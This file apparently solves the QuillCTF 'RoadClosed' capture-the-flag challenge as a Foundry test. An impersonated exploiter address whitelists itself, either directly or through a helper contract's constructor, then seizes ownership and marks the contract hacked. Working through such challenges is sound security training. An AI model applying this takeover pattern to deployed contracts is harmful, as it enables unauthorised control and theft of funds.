// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import '../../src/QuillCTF/RoadClosed.sol';
import '@forge-std/Test.sol';
import '@forge-std/console.sol';

interface IRoadClosed {
  function addToWhitelist(address addr) external;
}

contract Helper {
  constructor(address _target, address _whitelisted) {
    console.log('Exploiter adds its own address to the whitelist');
    IRoadClosed(_target).addToWhitelist(_whitelisted);
  }
}

contract RoadClosedExploit is Test {
  RoadClosed target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');

  // Deploy the target contract
  function setUp() public {
    vm.startPrank(deployer);
    target = new RoadClosed();
    console.log('Target contract deployed');
    vm.stopPrank();
  }

  function testNaiveExploit() public {
    vm.startPrank(exploiter);

    assertFalse(target.isOwner());
    assertFalse(target.isHacked());

    console.log('Exploiter adds its own address to the whitelist');
    target.addToWhitelist(exploiter);

    console.log('Exploiter takes ownership of the contract');
    target.changeOwner(exploiter);
    target.pwn(exploiter);
    assertTrue(target.isOwner());
    vm.stopPrank();

    assertTrue(target.isHacked());
    assertFalse(target.isOwner());
  }

  function testExploitWithHelperContract() public {
    vm.startPrank(exploiter);

    assertFalse(target.isOwner());
    assertFalse(target.isHacked());

    console.log('Exploiter deploys the helper contract');
    new Helper(address(target), exploiter);

    console.log('Exploiter takes ownership of the contract');
    target.changeOwner(exploiter);
    target.pwn(exploiter);
    assertTrue(target.isOwner());
    vm.stopPrank();

    assertTrue(target.isHacked());
    assertFalse(target.isOwner());
  }
}
